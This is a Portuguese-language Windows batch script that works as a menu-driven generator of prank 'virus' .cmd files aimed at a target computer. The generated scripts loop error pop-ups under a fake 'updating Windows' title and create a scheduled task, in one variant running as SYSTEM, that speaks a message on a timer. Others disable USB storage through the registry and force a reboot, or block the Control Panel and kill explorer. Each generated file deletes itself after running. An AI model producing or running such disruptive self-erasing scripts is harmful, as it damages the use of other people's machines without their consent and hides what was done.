echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script abre muitas janelas de Erro falso
echo.
echo  { Digite o aqui o Texto que voc deseja Mostre na janela
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p va=  TEXTO =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { Digite aqui o Texto que voc deseja Mostre na guia da janela
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p va1=  TEXTO DA GUIA =- 
:k
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { Digite um Nome para seu Script e pressione ENTER
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p va2=  NOME  =-  
if exist "%va2%".cmd (
cls
echo msgbox" Erro Jแ existe na pasta um Script com o nome, [ %va2% ]  Digite outro nome para o seu Script",vbinformation,"Aten็ใo" > %temp%\js.vbs
start %temp%\js.vbs
goto k
)
echo @echo off >>"%va2%".cmd
echo :1>>"%va2%".cmd
echo color 0a>>"%va2%".cmd
echo title Atualizando o windows>>"%va2%".cmd
echo echo .>>"%va2%".cmd
echo echo.>>"%va2%".cmd
echo echo      Aguarde atualizando Todos os drivers...>>"%va2%".cmd
echo echo.>>"%va2%".cmd
echo echo.>>"%va2%".cmd
echo echo x=MsgBox ("%va%",1+17,"%va1%")^>^>%%temp%%\001.vbs >>"%va2%".cmd
echo start %%temp%%\001.vbs >> "%va2%".cmd
echo goto 1 >>"%va2%".cmd
echo msgbox"o Script foi criado com sucesso. falso vํrus que apenas abre dezenas de janelas com um .VBS e dentro o Texto que voc๊ digitou ele Foi criado na pasta em que foi aberta a este script com o nome [ %va2% ]  ('_')",vbinformation,"parab้ns %username%" > %temp%\js.vbs
start %temp%\js.vbs
goto in
:v2
cls
mode 65,15
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este script vai fazer com que o computador alvo fale
echo.
echo  { a mensagem que voc digitar ele vai repetir ela no  
echo.
echo  { intervalo de tem que voc determinar digite o que  quiser
echo.
echo          { ATENCAO Nao usar Acentos nem cedilha }
echo          _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s= Digite uma frase  =- 
echo.
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { Digite o intervalo entre as mensagens 
echo.
echo  { o tempo em minutos por-EX 
echo.
echo  { voc pode colocar de 1 ate 1439  Minutos
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s2= Digite minutos  =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { Aqui digite qualquer nome para a tarefa  
echo.
echo  { tarefas com o mesmo nome da erro
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p s3= Digite o Nome da tarefa  =- 
:in4
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo                           ATEN€วO 
echo                          _________
echo.
echo     { se for usar o vกrus em Windows Xp pressione   =- j }
echo.
echo     { se for usar em  Windows vista 7/8 pressione   =- s }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p s6= Digite o ou e  =- 
if %s6% == j goto j3
if %s6% == s goto j2
echo msgbox"Erro [ %s6% ] nใo ้ um comando vแlido digite [ j ou s ] deve ser min๚sculo",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto in4
:j3
echo msgbox"ATENวรO seu vํrus esta sendo criado para Windows Xp ele nใo funciona em Windows vista 7/8 ele deve ser executado normalmente no Xp",vbinformation,"ATENวรO %username%" > %temp%\js03.vbs
start %temp%\js03.vbs
goto in2
:j2
echo msgbox"ATENวรO seu vํrus esta sendo criado para Windows Vista 7/8 ele nใo funciona em Windows Xp ele deve ser executado normalmente no Vista 7/8 NรO executade como Administrador",vbinformation,"ATENวรO %username%" > %temp%\js03.vbs
start %temp%\js03.vbs
goto in5
:in2
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p s4= Digite um Nome para o seu virus  =- 
if exist "%s4%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %s4% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto in2
)
echo @echo off >>"%s4%".cmd
echo cd /d %%~dp0 >>"%s4%".cmd
echo echo. ^>%%temp%%\js.vbs >>"%s4%".cmd
echo echo StrText = "%s%"  ^>^> %%temp%%\js.vbs >>"%s4%".cmd
echo echo set ObjVoice = CreateObject("SAPI.SpVoice") ^>^> %%temp%%\js.vbs >>"%s4%".cmd
echo echo ObjVoice.Rate=-1  ^>^> %%temp%%\js.vbs  >>"%s4%".cmd
echo echo ObjVoice.Speak StrText  ^>^> %%temp%%\js.vbs  >>"%s4%".cmd
echo SCHTASKS /create /ru system /sc minuto /mo %s2% /tn %s3% /tr %%temp%%\js.vbs >>"%s4%".cmd
echo del "%s4%".cmd >>"%s4%".cmd
echo. >%temp%\js.vbs 
echo StrText = " %s%" >> %temp%\js.vbs 
echo set ObjVoice = CreateObject("SAPI.SpVoice") >> %temp%\js.vbs 
echo ObjVoice.Rate=-1  >> %temp%\js.vbs 
echo ObjVoice.Speak StrText  >> %temp%\js.vbs 
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %s4% ] ele vai criar uma tarefa com o nome [ %s3% ] que vai ser repeti a cada [ %s2% Minuto ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in3
:in5
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p s4= Digite um Nome para o seu virus  =- 
if exist "%s4%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %s4% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto in5
)
echo @echo off  >>"%s4%".cmd
echo cd /d %%~dp0 >>"%s4%".cmd
echo echo. ^>%%temp%%\js.vbs >>"%s4%".cmd
echo echo StrText = "%s%"  ^>^> %%temp%%\js.vbs >>"%s4%".cmd
echo echo set ObjVoice = CreateObject("SAPI.SpVoice") ^>^> %%temp%%\js.vbs >>"%s4%".cmd
echo echo ObjVoice.Rate=-1  ^>^> %%temp%%\js.vbs >>"%s4%".cmd
echo echo ObjVoice.Speak StrText  ^>^> %%temp%%\js.vbs  >>"%s4%".cmd
echo SCHTASKS /create /sc minute /mo %s2% /tn %s3% /tr %%temp%%\js.vbs >>"%s4%".cmd
echo del "%s4%".cmd  >>"%s4%".cmd
echo. >%temp%\js.vbs 
echo StrText = " %s%" >> %temp%\js.vbs 
echo set ObjVoice = CreateObject("SAPI.SpVoice") >> %temp%\js.vbs 
echo ObjVoice.Rate=-1  >> %temp%\js.vbs 
echo ObjVoice.Speak StrText  >> %temp%\js.vbs 
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %s4% ] ele vai criar uma tarefa com o nome [ %s3% ] que vai ser repeti a cada [ %s2% Minuto ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
:in3
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para ouvir a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digita outra
echo.
echo  3 ^<= Voltar para o menu principal
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite  =- 
if %s5% == 1 goto 1
if %s5% == 2 goto 2
if %s5% == 3 goto in
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 a 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto in3
:1
start %temp%\js.vbs
goto in3
:2
del "%s4%.cmd"
goto v2
:v3
mode 65,15
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= Bloquear USB
echo.
echo  { 2 ^<= Desbloquear USB
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto bo
if %k% == 2 goto g1
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto b
:bo
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este script vai bloquear portas USB
echo.
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto k3
if %k% == n goto ss6
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto bo
:k3
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
:ss6
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto ss6
)
:s5
cls
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { O bloqueio sข tera efeito apขs boot deseja que
echo.
echo  { o computador alvo reinicie quando executar o script ?
echo.
echo  { pressione =- s  nฦo quero que ele reinicie =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= s ou n =- 
if %k6% == s goto s6 
if %k6% == n goto s7 
echo msgbox"Erro [ %k6% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto s5
:s6
 echo @echo off >>"%k7%".cmd
echo cd /d %%~dp0 >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4 >>"%k7%".cmd
 echo goto s2  >>"%k7%".cmd
 echo :n >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs  >>"%k7%".cmd
 echo tskill cmd >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo reg add HKLM\SYSTEM\CurrentControlSet\Services\usbstor /v Start /t REG_dword /d 00000004 /f >>"%k7%".cmd
echo msg * "%k2%"  >>"%k7%".cmd
echo shutdown -r -f -t 00  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:s7
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0 >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4  >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n )  >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4 >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
 echo reg add HKLM\SYSTEM\CurrentControlSet\Services\usbstor /v Start /t REG_dword /d 00000004 /f  >>"%k7%".cmd
echo msg * "%k2%"  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:g1
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto g1
)
:g2
cls
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { O bloqueio sข tera efeito apขs boot para deseja que
echo.
echo  { o computador alvo reinicie quando executar o script ?
echo.
echo  { pressione =- s  nฦo quero que ele reinicie =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= s ou n =- 
if %k6% == s goto g3 
if %k6% == n goto g4 
echo msgbox"Erro [ %k6% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto g2
:g3
 echo @echo off >>"%k7%".cmd
echo cd /d %%~dp0 >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n )  >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4 >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo reg add HKLM\SYSTEM\CurrentControlSet\Services\usbstor /v Start /t REG_dword /d 00000003 /f >>"%k7%".cmd
echo msg * "%k2%"  >>"%k7%".cmd
echo shutdown -r -f -t 00  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:g4
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo reg add HKLM\SYSTEM\CurrentControlSet\Services\usbstor /v Start /t REG_dword /d 00000003 /f >>"%k7%".cmd
echo msg * "%k2%"  >>"%k7%".cmd
echo del "%k7%.cmd" >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in

:v4
mode 65,15
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= Bloquear Painel de controle
echo.
echo  { 2 ^<= Desbloquear Painel de controle
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto a1
if %k% == 2 goto a7
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto v4
:a1
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando o Script vกrus for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto a2
if %k% == n goto a8
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a1
:a2
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Essa mensagem vai aparecer numa janela .vbs }
echo.
echo           { ATENCAO Nao usar Acentos nem cedilha }
echo           _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Digite o Nome da janela nome que fica naguia }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= Digite a nome da guia da janela =- 
:a5
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para testa a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digitar outra
echo.
echo  3 ^<= continuar com a criaฦo do meu vกrus
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite  =- 
if %s5% == 1 goto t1
if %s5% == 2 goto a2
if %s5% == 3 goto a3
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto a5
:t1
echo msgbox"%k2%",vbinformation,"%k6%" > %temp%\js.vbs 
start %temp%\js.vbs
goto a5
:a3
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a3
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:a8
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a8
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
